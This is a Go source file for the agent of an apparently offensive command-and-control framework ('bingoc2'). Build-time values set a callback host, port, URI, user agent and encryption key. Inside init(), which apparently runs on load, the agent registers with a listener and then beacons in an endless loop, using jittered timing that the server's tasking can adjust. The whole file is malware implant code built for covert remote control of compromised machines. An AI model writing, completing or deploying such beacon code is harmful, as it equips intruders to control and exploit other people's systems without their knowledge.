package main

import (
	"dingo/check"
	"dingo/hg"
	"dingo/initialization"
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/lthibault/jitterbug"
)

import "C"

var (
	sSLEEP          string                         // whats edited by the go compiler
	sJITTER         string                         // whats edited by the go compiler
	SLEEP, _               = strconv.Atoi(sSLEEP)  // interval between callbacks
	JITTER, _              = strconv.Atoi(sJITTER) // +- time in callbacks
	RHOST           string = "127.0.0.1"           // host to callback to
	RPORT           string = "80"                  // port to callback to
	LISTENER_NAME   string = "example listener"    // name of listener calling back to
	BEACON_NAME     string = "example beacon"      // name of the beacon this agent is from
	USERAGENT       string = "bingoc2/1.0.0"       // useragent of callback
	USERAGENT_FIXED string = strings.ReplaceAll(USERAGENT, "....", " ")
	URI             string = "index.php" // uri to callback to
	sKeya           string               // key for encryption
	sKeyb           string
	sKeyc           string
	sKeyd           string

	AgentID string = hg.RandomStr(4) // ID of agent (used by server to identify who is calling)
)

func init() {
	fixedAgent := strings.ReplaceAll(USERAGENT_FIXED, "////", ")")
	fixedAgent = strings.ReplaceAll(fixedAgent, "****", "(")
	fixedAgent = strings.ReplaceAll(fixedAgent, "----", ",")
	fixedAgent = strings.ReplaceAll(fixedAgent, "++++", ";")

	sleep := SLEEP

	nKeya, _ := strconv.ParseUint(sKeya, 10, 64)
	nKeyb, _ := strconv.ParseUint(sKeyb, 10, 64)
	nKeyc, _ := strconv.ParseUint(sKeyc, 10, 64)
	nKeyd, _ := strconv.ParseUint(sKeyd, 10, 64)

	bKey := make([]byte, 0)
	bKeya := make([]byte, 8)
	bKeyb := make([]byte, 8)
	bKeyc := make([]byte, 8)
	bKeyd := make([]byte, 8)

	binary.BigEndian.PutUint64(bKeya, nKeya)
	binary.BigEndian.PutUint64(bKeyb, nKeyb)
	binary.BigEndian.PutUint64(bKeyc, nKeyc)
	binary.BigEndian.PutUint64(bKeyd, nKeyd)

	bKey = append(bKey, bKeya...)
	bKey = append(bKey, bKeyb...)
	bKey = append(bKey, bKeyc...)
	bKey = append(bKey, bKeyd...)

	// initiliaze sessions
	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, fixedAgent, bKey, BEACON_NAME)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	// create ticker for callbacks with sleep and jitter
	ticker := jitterbug.New(
		time.Second*time.Duration(sleep),
		&jitterbug.Norm{Stdev: time.Second * time.Duration(JITTER)},
	)

	// checkin with server based on ticker
	for range ticker.C {
		check.CheckIn(RHOST, RPORT, URI, &sleep, JITTER, LISTENER_NAME, AgentID, fixedAgent, bKey, BEACON_NAME)
		// change ticker if tasking changed sleep
		ticker.Interval = time.Second * time.Duration(sleep)
	}
}
